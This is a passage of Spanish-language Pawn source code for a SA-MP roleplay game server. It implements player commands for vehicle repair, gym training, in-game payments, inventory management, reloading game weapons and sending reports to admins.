	 	    	format(string, sizeof(string), "Rango: %s", FaccInfo[1][fRango7]);
	 	    	SendClientMessage(playerid2, Blanco, string);
	 	    }
	 	    case 8:
	 	    {
	 	    	format(string, sizeof(string), "Rango: %s", FaccInfo[1][fRango8]);
	 	    	SendClientMessage(playerid2, Blanco, string);
	 	    }
 	    }
 	    format(string, sizeof(string), "Nº de agente: %d", PlayerInfo[playerid][pSQLID]+1000);
 	    SendClientMessage(playerid2, Blanco, string);
 	    SendClientMessage(playerid2, Amarillo, "-------------------");
        return 1;
    }
    else
    {
        SendClientMessage(playerid, Naranja, "* /Mostrar [Opción] [ID]");
        SendClientMessage(playerid, Naranja, "DNI, Licencias, PapelesCoche");
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/autoreparar", true) == 0) //Repararse automáticamente un vehículo en el taller
{
	if(!GetPlayerVehicleID(playerid)){SendClientMessage(playerid, Rojo, "* No estás en ningún vehículo."); return 1;}
	if(SiendoReparado[playerid] == 1){SendClientMessage(playerid, Rojo, "* Tu vehículo está siendo reparado, espera a que terminen."); return 1;}
    if(!IsPlayerInRangeOfPoint(playerid, 5.0, 2527.5347,-2073.0044,13.5469) && !IsPlayerInRangeOfPoint(playerid, 5.0, 1908.0222,-1864.7769,13.5639)){SendClientMessage(playerid, Rojo, "* No estás en un taller público."); return 1;}
	new haymecanicos;
	for(new x=0; x<MAX_PLAYERS; x++)
	{
	    if(PlayerInfo[x][pTrabajo] == 7) haymecanicos ++;
	    if(haymecanicos >= 3) break;
	}
	if(haymecanicos >= 3){SendClientMessage(playerid, Rojo, "* Hay más de 3 mecánicos conectados, busca uno."); return 1;}
	if(GetPlayerMoney(playerid) < 400){SendClientMessage(playerid, Rojo, "* Necesitas 400$."); return 1;}

	new coche = GetPlayerVehicleID(playerid);
	new Float:cvida;
    GetVehicleHealth(coche, cvida);
    new panels,doors,lights,tires;
	GetVehicleDamageStatus(coche,panels,doors,lights,tires);
	if(cvida == 1000 && panels == 0 && doors == 0 && lights == 0 && tires == 0){SendClientMessage(playerid, Rojo, "* Tu vehículo está en perfecto estado."); return 1;}

    format(string, sizeof(string), "* Un mecánico del taller comienza a reparar el vehículo de %s.", GetPlayerNameRP(playerid));
 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
    SiendoReparado[playerid] = 1;
	TogglePlayerControllable(playerid, 0);
	SetTimerEx("Descongelar", 100000, false, "i", playerid);
	GameTextForPlayer(playerid, "~g~Reparando vehiculo", 100000, 3);
	SetTimerEx("RepararMeca", 100000, false, "i d d", playerid, 4, coche);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/bandeja", true) == 0) //Comando para comer en la prisión federal
{
	if(PlayerInfo[playerid][pEncarcelado] != 2){SendClientMessage(playerid, Rojo, "* No estás encarcelado en la prisión federal."); return 1;}
	if(!IsPlayerInRangeOfPoint(playerid, 2.0, 2567.2358,-1283.9948,1044.1250)){SendClientMessage(playerid, Rojo, "* No estás en el comedor de la prisión federal."); return 1;}
	if(PlayerInfo[playerid][pHambre] >= MAX_HAMBRE && PlayerInfo[playerid][pSed] >= MAX_SED){SendClientMessage(playerid, Rojo, "* No tienes hambre ni sed."); return 1;}
	
	if(PlayerInfo[playerid][pHambre] < MAX_HAMBRE)PlayerInfo[playerid][pHambre] = MAX_HAMBRE, ActualizarHambre(playerid);
	if(PlayerInfo[playerid][pSed] < MAX_SED)PlayerInfo[playerid][pSed] = MAX_SED, ActualizarSed(playerid);
	format(string, sizeof(string), "* %s coge su bandeja de comida.", GetPlayerNameRP(playerid));
 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/vm", true) == 0) //Comando ver matriculas de vehiculos
{
    if(MatriculasActivadas[playerid] == 0)
    {
        MatriculasActivadas[playerid] = 1;
        for(new i; i <= MAX_VEHPUBLICO; i++)
		{
			if(!IsValidVehicle(i))
			{
				continue;
			}
			format(string, sizeof(string), "LS-%d\nID: %d", 1000+i-MAX_VEHPUBLICO, i);
			MatriculasCoches[playerid][i] = CreatePlayer3DTextLabel(playerid, string, Aguamarina, 0.0, 0.0, 0.0, 10.0, -1, i);
		}
        for(new i = MAX_VEHPUBLICO+1; i < MAX_VEHICLES; i++)
		{
			if(!IsValidVehicle(i))
			{
				continue;
			}
			format(string, sizeof(string), "LS-%d\nID: %d", CarInfo[i][cLlave], i);
			MatriculasCoches[playerid][i] = CreatePlayer3DTextLabel(playerid, string, Aguamarina, 0.0, 0.0, 0.0, 10.0, -1, i);
		}
		SendClientMessage(playerid, Amarillo, "Textos flotantes de matriculas activados.");
    }
    else
    {
        MatriculasActivadas[playerid] = 0;
        for(new i; i < MAX_VEHICLES; i++)
		{
			DeletePlayer3DTextLabel(playerid, MatriculasCoches[playerid][i]);
		}
		SendClientMessage(playerid, Amarillo, "Textos flotantes de matriculas desactivados.");
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/entrenar", true) == 0) //Comando para entrenar en gyms
{
    if(HaciendoPressBanca[playerid] == 1){SendClientMessage(playerid, Rojo, "* Ya estás haciendo algún tipo de ejercicio."); return 1;}
    if(PlayerInfo[playerid][pCansancioEntrenar] > 0)
    {
        format(string, sizeof(string), "* Estás cansado de entrenar. Debes esperar %d minutos.", PlayerInfo[playerid][pCansancioEntrenar]);
        SendClientMessage(playerid, Rojo, string);
        return 1;
    }
    new opcion[25];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Entrenar [Opción]");
		SendClientMessage(playerid, Naranja, "PressBanca");
		return 1;
	}
	if(strcmp(opcion,"PressBanca",true) == 0)
	{
	    new DetectarPressBanca, banca;
		for(new x; x < sizeof(PressBancaPlayerPos); x++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 2.0, PressBancaPlayerPos[x][0], PressBancaPlayerPos[x][1], PressBancaPlayerPos[x][2]))
			{
				DetectarPressBanca = 1;
				banca = x;
				DestroyObject(PressBancaBarraObjeto[x]);
				break;
			}
		}
		if(DetectarPressBanca == 0){SendClientMessage(playerid, Rojo, "* No estás al lado de una máquina para hacer ese ejercicio."); return 1;}
		format(string, sizeof(string), "* %s se tumba en la máquina de press banca y comienza a levantar una barra de %dKg.", GetPlayerNameRP(playerid), PlayerInfo[playerid][pFuerza]/100*25);
	    ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
		HaciendoPressBanca[playerid] = 1;
		TogglePlayerControllable(playerid, 0);
		SetPlayerPos(playerid, PressBancaPlayerPos[banca][0], PressBancaPlayerPos[banca][1], PressBancaPlayerPos[banca][2]);
		SetPlayerFacingAngle(playerid, PressBancaPlayerPos[banca][3]);
		ApplyAnimation(playerid, "benchpress", "gym_bp_geton", 1, 0, 0, 0, 1, 0, 1);
		SendClientMessage(playerid, Amarillo, "Pulsa LCTRL tantas veces como puedas en 1 minuto.");
		SendClientMessage(playerid, Naranja, "* Escriba '/DEntrenar' para dejar de hacer ejercicio.");
		SetTimerEx("TimerEntrenar", 60000, false, "i, d", playerid, 1);
		SetPlayerAttachedObject(playerid, 5, 2913, 6);
		return 1;
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/dentrenar", true) == 0) //Comando para dejar de entrenar en gyms
{
    if(HaciendoPressBanca[playerid] == 0){SendClientMessage(playerid, Rojo, "* No estás haciendo ningún tipo de ejercicio."); return 1;}
    TimerEntrenar(playerid, 1);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/caja", true) == 0) //Comando de cajas de armamentos
{
    new opcion[25];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Caja [Opción]");
		SendClientMessage(playerid, Naranja, "Sacar");
		return 1;
	}
	if(strcmp(opcion,"sacar",true) == 0)
	{
	    if(!GetPlayerCajaArmamento(playerid, 1) && !GetPlayerCajaArmamento(playerid, 2)){SendClientMessage(playerid, Rojo, "* No tienes una caja de armamento en ninguna mano."); return 1;}
	    if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Debes tener una mano vacía."); return 1;}
	    if(GetPlayerCajaArmamento(playerid, 1)) //Caja de armamento en mano derecha
	    {
	        new objeto = GetPlayerCajaArmamento(playerid, 1);
	        PlayerInfo[playerid][pManoDerCant] --;
	        PlayerInfo[playerid][pManoIzq] = objeto, PonerObjeto(playerid, 2, objeto);
			PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];
			format(string, sizeof(string), "* Has sacado un/a {fce80c}%s (%d){FFFFFF} de la caja.", ObjetoInfo[objeto][NombreObjeto], PlayerInfo[playerid][pManoIzqCant]);
			SendClientMessage(playerid, Blanco, string);
			format(string, sizeof(string), "* %s saca un/a %s de una caja de armamento.", GetPlayerNameRP(playerid), ObjetoInfo[objeto][NombreObjeto]);
 			ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 			return 1;
	    }
	    else if(GetPlayerCajaArmamento(playerid, 2)) //Caja de armamento en mano izquierda
	    {
	        new objeto = GetPlayerCajaArmamento(playerid, 2);
	        PlayerInfo[playerid][pManoIzqCant] --;
	        PlayerInfo[playerid][pManoDer] = objeto, PonerObjeto(playerid, 1, objeto);
	        if(ObjetoInfo[objeto][IDArma] != 0)
	        {
	            GivePlayerWeapon(playerid, ObjetoInfo[objeto][IDArma], ObjetoInfo[objeto][Capacidad]);
	        }
			PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];
			format(string, sizeof(string), "* Has sacado un/a {fce80c}%s (%d){FFFFFF} de la caja.", ObjetoInfo[objeto][NombreObjeto], PlayerInfo[playerid][pManoDerCant]);
			SendClientMessage(playerid, Blanco, string);
			format(string, sizeof(string), "* %s saca un/a %s de una caja de armamento.", GetPlayerNameRP(playerid), ObjetoInfo[objeto][NombreObjeto]);
 			ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 			return 1;
	    }
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/intentar", true) == 0 || strcmp(cmd, "/int", true) == 0) //Intentar una acción
{
	if(IntentarUsado[playerid] > 0){SendClientMessage(playerid, Rojo, "* Debes esperar 15 segundos antes de volver a usar este comando."); return 1;}
	new rand = random(100);
	if(rand < 50)
	{
	    format(string, sizeof(string), "* %s logró lo que intentaba", GetPlayerNameRP(playerid));
        ProxDetector(15.0,playerid, string, VerdeClaro,VerdeClaro,VerdeClaro,VerdeClaro,VerdeClaro);
        printf(string);
     	IntentarUsado[playerid] = 30;
	}
	else
	{
		format(string, sizeof(string), "* %s falló en su intento", GetPlayerNameRP(playerid));
		ProxDetector(15.0,playerid, string, RojoIntenso,RojoIntenso,RojoIntenso,RojoIntenso,RojoIntenso);
		printf(string);
		IntentarUsado[playerid] = 30;
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/minpayday", true) == 0) //Ver cuanto queda para el siguiente payday
{
	format(string, sizeof(string), "Te quedan %d minutos para recibir tu próximo payday.", 55-PlayerInfo[playerid][pMinPayDay]);
	SendClientMessage(playerid, Amarillo, string);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/hora", true) == 0) //Reporta a la administración
{
	if(PlayerInfo[playerid][pEncarcelado] > 0)
	{
		format(string, sizeof(string), "Tiempo de cárcel: %d minutos.", PlayerInfo[playerid][pTiempoCarcel]);
		SendClientMessage(playerid, AmarilloClaro, string);
	}
	if(!GetPlayerReloj(playerid)){SendClientMessage(playerid, Rojo, "* No tienes un reloj en ninguna mano ni en el inventario."); return 1;}
	new hour,minuto;
	gettime(hour,minuto);
	format(string, sizeof(string), "~g~|~w~%d:%d~g~|", hour, minuto);
	GameTextForPlayer(playerid, string, 5000, 1);
	ApplyAnimation(playerid,"COP_AMBIENT","Coplook_watch",4.1,0,0,0,0,0);
	format(string, sizeof(string), "* %s mira la hora en su %s.", GetPlayerNameRP(playerid), ObjetoInfo[GetPlayerReloj(playerid)][NombreObjeto]);
 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/duda", true) == 0) //Reporta a la administración
{
    new length = strlen(cmdtext);
	while ((idx < length) && (cmdtext[idx] <= ' '))
	{
		idx++;
	}
	new offset = idx;
	new result[150];
	while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	{
		result[idx - offset] = cmdtext[idx];
		idx++;
	}
	result[idx - offset] = EOS;
	if(!strlen(result))
	{
		SendClientMessage(playerid, Naranja, "* /Duda [Duda]");
		return 1;
	}
	new string2[255];
	format(string, sizeof(string), "Duda de %s [ID: %d]:", GetPlayerNameRP(playerid), playerid);
	SendAdminMessage(AzulClaro, string);
	format(string2, sizeof(string2), "Duda: %s", result);
    SendAdminMessage(AzulClaro, string2);

	SendClientMessage(playerid, Amarillo, "Duda enviada a la administración. Espera a que te respondan.");
	format(string2, sizeof(string2), "Duda: %s", result);
    SendClientMessage(playerid, Amarillo, string2);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/reportar", true) == 0) //Reporta a la administración
{
    new length = strlen(cmdtext);
	while ((idx < length) && (cmdtext[idx] <= ' '))
	{
		idx++;
	}
	new offset = idx;
	new result[150];
	while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
	{
		result[idx - offset] = cmdtext[idx];
		idx++;
	}
	result[idx - offset] = EOS;
	if(!strlen(result))
	{
		SendClientMessage(playerid, Naranja, "* /Reportar [Reporte]");
		return 1;
	}
	new string2[255];
	format(string, sizeof(string), "Reporte de %s [ID: %d]:", GetPlayerNameRP(playerid), playerid);
	SendAdminMessage(Ocre, string);
	format(string2, sizeof(string2), "Reporte: %s", result);
    SendAdminMessage(Ocre, string2);
    
	SendClientMessage(playerid, Amarillo, "Reporte enviado a la administración. Espera a que te respondan.");
	format(string2, sizeof(string2), "Reporte: %s", result);
    SendClientMessage(playerid, Amarillo, string2);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/mecaigo", true) == 0) //Anti bug caida
{
	new Float:vvelocidad[3];
	GetPlayerVelocity(playerid, vvelocidad[0], vvelocidad[1], vvelocidad[2]);
    if(GetPlayerAnimationIndex(playerid) == 1130 && (GetPlayerInterior(playerid) != 0 || GetPlayerVirtualWorld(playerid) != 0) && vvelocidad[2] <= -1)
    {
        format(string, sizeof(string), "'%s' ha usado el comando /mecaigo y ha sido teleportado al ayuntamiento.", GetPlayerNameRP(playerid));
        SendAdminMessage(Aguamarina, string);
        printf(string);
        ProxDetector(50.0, playerid, string, AmarilloClaro,AmarilloClaro,AmarilloClaro,AmarilloClaro,AmarilloClaro);
        SetPlayerInterior(playerid, 0);
        SetPlayerVirtualWorld(playerid, 0);
        SetPlayerPos(playerid, 1479.6182, -1724.0615, 13.5469);
        return 1;
    }
    else{SendClientMessage(playerid, Rojo, "* No se ha detectado que estés cayendo por bug.");}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/pagar", true) == 0) //Da dinero a un jugador
{
	if(PlayerInfo[playerid][pNivel] < 2){SendClientMessage(playerid,Rojo,"* Debes ser nivel 2 para usar este comando."); return 1;}
	if(PagarTimer[playerid] == 1){SendClientMessage(playerid,Rojo,"* Debes esperar 1 minuto antes de volver a usar este comando."); return 1;}
    tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /Pagar [ID] [Cantidad]");
		return 1;
	}
    playerid2 = ReturnUser(tmp);
	if(!IsPlayerConnected(playerid2) || playerid2 == INVALID_PLAYER_ID){SendClientMessage(playerid,Rojo,"* ID inválida."); return 1;}
	if(playerid == playerid2){SendClientMessage(playerid,Rojo,"* No puedes pagarte a tí mismo."); return 1;}
	tmp = strtok(cmdtext, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, Naranja, "* /Pagar [ID] [Cantidad]");
		return 1;
	}
	new dinero = strval(tmp);
	if(dinero < 1 || dinero > 50000){SendClientMessage(playerid, Rojo, "* La cantidad solo puede estar entre 1$ y 50000$."); return 1;}
	if(GetPlayerMoney(playerid) < dinero){SendClientMessage(playerid,Rojo,"* No tienes tanto dinero."); return 1;}
	if(!GetPlayersProx(5.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
	format(string, sizeof(string), "* %s da a %s algo de dinero.", GetPlayerNameRP(playerid), GetPlayerNameRP(playerid2));
 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	GivePlayerMoneyAC(playerid, -dinero);
	GivePlayerMoneyAC(playerid2, dinero);
	PagarTimer[playerid] = 1;
	SetTimerEx("TimerPagar", 60000, false, "i", playerid);
	format(string, sizeof(string), "Has dado %d$ a %s.", dinero, GetPlayerNameRP(playerid2));
	SendClientMessage(playerid, Amarillo, string);
	format(string, sizeof(string), "%s te ha dado %d$.", GetPlayerNameRP(playerid), dinero);
	SendClientMessage(playerid2, Amarillo, string);

	format(string, sizeof(string), "'%s' ha pagado %d$ a '%s'.", GetPlayerNameRP(playerid), dinero,  GetPlayerNameRP(playerid2));
    SendAdminMessage(Aguamarina, string);

	printf("%s ha dado %d$ a %s", GetPlayerNameRP(playerid), dinero,  GetPlayerNameRP(playerid2));
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/habilidades", true) == 0) //Muestra habilidades del jugador
{
    new opcion[128];
    opcion = strtok(cmdtext, idx);
    if(!strlen(opcion))
    {
        SendClientMessage(playerid, Naranja, "* /Habilidades [Opción]");
        SendClientMessage(playerid, Naranja, "Trabajos, Armas, Fisicas");
        return 1;
    }
    if(strcmp(opcion,"Trabajos",true) == 0)
    {
        SendClientMessage(playerid, Amarillo, "||____________________ Habilidades de trabajos ____________________||");
		new mecnivel = (PlayerInfo[playerid][pHabMec]/30)+1;
	    format(string, sizeof(string), "Nivel de mecánico: %d (%d/%d)", mecnivel, PlayerInfo[playerid][pHabMec], mecnivel*30);
	    SendClientMessage(playerid, AmarilloClaro, string);
	    new ladnivel = (PlayerInfo[playerid][pHabLad]/30)+1;
	    format(string, sizeof(string), "Nivel de ladrón: %d (%d/%d)", ladnivel, PlayerInfo[playerid][pHabLad], ladnivel*30);
	    SendClientMessage(playerid, AmarilloClaro, string);
	    return 1;
    }
    else if(strcmp(opcion,"Armas",true) == 0)
    {
        SendClientMessage(playerid, Amarillo, "||____________________ Habilidades de armas ____________________||");
	    format(string, sizeof(string), "Hab M1911: %d | Hab D. Eagle: %d", PlayerInfo[playerid][pHabPistola], PlayerInfo[playerid][pHabDEagle]);
	    SendClientMessage(playerid, AmarilloClaro, string);
	    format(string, sizeof(string), "Hab Escopeta: %d | Hab Sawnoff: %d | Hab SPAS12: %d", PlayerInfo[playerid][pHabEscopeta], PlayerInfo[playerid][pHabSawnoff], PlayerInfo[playerid][pHabEscopetaCom]);
	    SendClientMessage(playerid, AmarilloClaro, string);
	    format(string, sizeof(string), "Hab UZI/TEC-9: %d | Hab MP5: %d", PlayerInfo[playerid][pHabUZI], PlayerInfo[playerid][pHabMP5]);
	    SendClientMessage(playerid, AmarilloClaro, string);
	    format(string, sizeof(string), "Hab AK47: %d | Hab M4: %d", PlayerInfo[playerid][pHabAK47], PlayerInfo[playerid][pHabM4]);
	    SendClientMessage(playerid, AmarilloClaro, string);
	    format(string, sizeof(string), "Hab Rifle: %d", PlayerInfo[playerid][pHabFranco]);
	    SendClientMessage(playerid, AmarilloClaro, string);
	    return 1;
    }
    else if(strcmp(opcion,"Fisicas",true) == 0)
    {
        SendClientMessage(playerid, Amarillo, "||____________________ Habilidades físicas ____________________||");
	    format(string, sizeof(string), "Fuerza: %.2f", float(PlayerInfo[playerid][pFuerza])/100);
	    SendClientMessage(playerid, AmarilloClaro, string);
    }
    else
    {
        SendClientMessage(playerid, Naranja, "* /Habilidades [Opción]");
        SendClientMessage(playerid, Naranja, "Trabajos, Armas, Fisicas");
    }
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/cuenta", true) == 0) //Muestra las stats del jugador
{
    ShowStats(AmarilloClaro, playerid, playerid);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/admins", true) == 0) //Muestra los admins conectados de servicio
{
    format(string, sizeof(string), "Admins conectados de servicio:", PlayerInfo[playerid][pFaccion]);
	SendClientMessage(playerid, Amarillo, string);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && i != INVALID_PLAYER_ID && AdminDuty[i])
		{
			format(string, sizeof(string), "- %s", GetPlayerNameRP(i));
			SendClientMessage(playerid, Blanco, string);
		}
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/inventario",true) == 0 || strcmp(cmd,"/inv",true) == 0) //Inventario
{
	if(PlayerInfo[playerid][pServicioPD] > 0){SendClientMessage(playerid, Rojo, "* No puedes usar este comando estando de servicio."); return 1;}
	MostrarInv(playerid);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/cin",true) == 0) //Cinturón PD
{
	if(PlayerInfo[playerid][pFaccion] != 1){SendClientMessage(playerid, Rojo, "* No eres policía."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] == 0){SendClientMessage(playerid, Rojo, "* No estás de servicio."); return 1;}
	MostrarCint(playerid);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/mano",true) == 0) //Cambiar objetos de mano
{
	CambiarObjetosMano(playerid);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/usar",true) == 0) //Usar objetos
{
	if(PlayerInfo[playerid][pManoDer] == 0 && PlayerInfo[playerid][pManoIzq] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en ninguna mano."); return 1;}
	new ManoDer = PlayerInfo[playerid][pManoDer], ManoDerCant = PlayerInfo[playerid][pManoDerCant];
	new ManoIzq = PlayerInfo[playerid][pManoIzq], ManoIzqCant = PlayerInfo[playerid][pManoIzqCant];
	if(ObjetoInfo[ManoDer][IDArma] > 0 && ObjetoInfo[ManoDer][Capacidad] > 1 && ManoIzq != 0) //Tiene un arma en mano derecha y algo en mano izquierda
	{
		ActualizarManos(playerid);
	    new Cargador, ArmaID = ObjetoInfo[ManoDer][IDArma];
	    switch(ArmaID)
	    {
	        case 22: Cargador = 39;
	        case 23: Cargador = 39;
			case 24: Cargador = 40;
			case 25: Cargador = 50;
			case 26: Cargador = 50;
			case 27: Cargador = 50;
			case 28: Cargador = 41;
			case 29: Cargador = 42;
			case 30: Cargador = 44;
			case 31: Cargador = 45;
			case 32: Cargador = 43;
			case 33: Cargador = 46;
			case 34: Cargador = 46;
	    }
	    if(ManoIzq != Cargador){SendClientMessage(playerid, Rojo, "* No puedes recargar este arma con este objeto."); return 1;}
	    if(RecargarTiempo[playerid] == 1){SendClientMessage(playerid, Rojo, "* Espera 3 segundos antes de volver a recargar."); return 1;}
	    if(ArmaID != 25 && ArmaID != 26 && ArmaID != 27) //No es una escopeta
	    {
	        if(ManoIzqCant == 0){SendClientMessage(playerid, Rojo, "* Ese cargador está vacio."); return 1;}
			ResetPlayerWeapons(playerid);
		    GivePlayerWeapon(playerid, ArmaID, ManoIzqCant);
		 	PlayerInfo[playerid][pManoIzqCant] = ManoDerCant;
		 	format(string, sizeof(string), "* %s recarga su arma.", GetPlayerNameRP(playerid));
		    ProxDetector(5.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		    RecargarTiempo[playerid] = 1;
		    SetTimerEx("RecargarTimer", 3000, false, "i", playerid);
	 	}
	 	else
	 	{
	 	    new n;
	 	    switch(ArmaID)
	 	    {
	 	        case 25: n = 4;
	 	        case 26: n = 2;
	 	        case 27: n = 7;
	 	    }
	 	    if(GetPlayerWeaponAmmo(playerid, ArmaID) >= n){SendClientMessage(playerid, Rojo, "* No necesitas recargar este arma."); return 1;}
	 	    if(ManoIzqCant == 0){SendClientMessage(playerid, Rojo, "* No te queda munición."); return 1;}
	 	    new Municion = (n - GetPlayerWeaponAmmo(playerid, ArmaID));
	 	    for(new a = 0; a < Municion; a++)
	 	    {
					if(PlayerInfo[playerid][pManoIzqCant] == 0){break;}
	 	    		GivePlayerWeapon(playerid, ArmaID, 1);
	 	    		PlayerInfo[playerid][pManoIzqCant] --;
	 	    }
	 	    format(string, sizeof(string), "* %s recarga su arma.", GetPlayerNameRP(playerid));
		    ProxDetector(5.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
		    RecargarTiempo[playerid] = 1;
		    SetTimerEx("RecargarTimer", 3000, false, "i", playerid);
	 	}
	 	return 1;
	}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/bolsillo",true) == 0 || strcmp(cmd,"/bol",true) == 0) //Saca un objeto del inventario
{
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /(Bol)sillo [#Bol]");
        return 1;
    }
    new Bol = strval(tmp);
    if(PlayerInfo[playerid][pServicioPD] <= 0)
    {
	    if(Bol < 1 || Bol > 8){SendClientMessage(playerid, Rojo, "* El número del bolsillo debe estar entre 1 y 8."); return 1;}
		SacarBolsillo(playerid, Bol-1);
	}
	else if(PlayerInfo[playerid][pServicioPD] > 0)
	{
	    if(Bol < 1 || Bol > 8){SendClientMessage(playerid, Rojo, "* Estás de servicio, el número del bolsillo debe estar entre 1 y 5."); return 1;}
		SacarCint(playerid, Bol-1);
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/guardar",true) == 0) //Guarda un objeto en el inventario
{
	new Mano[20];
	Mano = strtok(cmdtext, idx);
	if(!strlen(Mano))
	{
		SendClientMessage(playerid, Naranja, "* /Guardar [Izq/Der]");
		return 1;
	}
	if(strcmp(Mano,"izq",true) == 0)
	{
	    if(PlayerInfo[playerid][pServicioPD] <= 0) GuardarBolsillo(playerid, 2);
     	if(PlayerInfo[playerid][pServicioPD] > 0) GuardarCint(playerid, 2);
    }
    else if(strcmp(Mano,"der",true) == 0)
	{
	    if(PlayerInfo[playerid][pServicioPD] <= 0) GuardarBolsillo(playerid, 1);
	    if(PlayerInfo[playerid][pServicioPD] > 0) GuardarCint(playerid, 1);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/ceder",true) == 0) //Ceder un objeto a otro jugador
{
	if(CederTiempo[playerid] == 1){SendClientMessage(playerid, Rojo, "* Espera 3 segundos para ceder otro objeto."); return 1;}
	new Mano[20];
	Mano = strtok(cmdtext, idx);
	if(!strlen(Mano))
	{
		SendClientMessage(playerid, Naranja, "* /Ceder [Izq/Der] [ID]");
		return 1;
	}
	tmp = strtok(cmdtext, idx);
    if(!strlen(tmp))
    {
        SendClientMessage(playerid, Naranja, "* /Ceder [Izq/Der] [ID]");
        return 1;
    }
    playerid2 = ReturnUser(tmp);
    if(playerid2 == playerid){SendClientMessage(playerid, Rojo, "* No te puedes pasar objetos a tí mismo."); return 1;}
    if(PlayerInfo[playerid][pServicioPD] > 0 && PlayerInfo[playerid2][pServicioPD] == 0){SendClientMessage(playerid, Rojo, "* Si estás de servicio solo puedes ceder objetos a personas que también estén de servicio."); return 1;}
    if((playerid2 == INVALID_PLAYER_ID) || !IsPlayerConnected(playerid2))
	{
		SendClientMessage(playerid, Rojo, "* ID inválida.");
		return 1;
	}
	if(!GetPlayersProx(5.0, playerid, playerid2)){SendClientMessage(playerid, Rojo, "* Demasiado lejos."); return 1;}
	if(strcmp(Mano,"izq",true) == 0)
	{
	    if(PlayerInfo[playerid][pManoIzq] <= 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano izquierda."); return 1;}
	    if(PlayerInfo[playerid2][pManoIzq] > 0 && PlayerInfo[playerid2][pManoDer] > 0){SendClientMessage(playerid, Rojo, "* Este jugador tiene ambas manos ocupadas."); return 1;}
		new ManoIzq = PlayerInfo[playerid][pManoIzq], ManoIzqCant = PlayerInfo[playerid][pManoIzqCant];
	    if(PlayerInfo[playerid2][pManoDer] == 0)
		{
            if(ObjetoInfo[ManoIzq][IDArma] > 0){GivePlayerWeapon(playerid2, ObjetoInfo[ManoIzq][IDArma], ManoIzqCant);}
			PlayerInfo[playerid2][pManoDer] = ManoIzq, PlayerInfo[playerid2][pManoDerCant] = ManoIzqCant, PonerObjeto(playerid2, 1, ManoIzq), ActualizarManos(playerid2);
		}
	    else if(PlayerInfo[playerid2][pManoIzq] == 0){PlayerInfo[playerid2][pManoIzq] = ManoIzq, PlayerInfo[playerid2][pManoIzqCant] = ManoIzqCant, PonerObjeto(playerid2, 2, ManoIzq), ActualizarManos(playerid2);}
	    PlayerInfo[playerid][pManoIzq] = 0, PlayerInfo[playerid][pManoIzqCant] = 0, ActualizarManos(playerid);
	    format(string, sizeof(string), "* {fce80c}%s {FFFFFF}te ha dado un/a {fce80c}%s (%d){FFFFFF}.", GetPlayerNameRP(playerid), ObjetoInfo[ManoIzq][NombreObjeto], ManoIzqCant);
	    SendClientMessage(playerid2, Blanco, string);
	    format(string, sizeof(string), "* Has dado a {fce80c}%s {FFFFFF}un/a {fce80c}%s (%d){FFFFFF}.", GetPlayerNameRP(playerid2), ObjetoInfo[ManoIzq][NombreObjeto], ManoIzqCant);
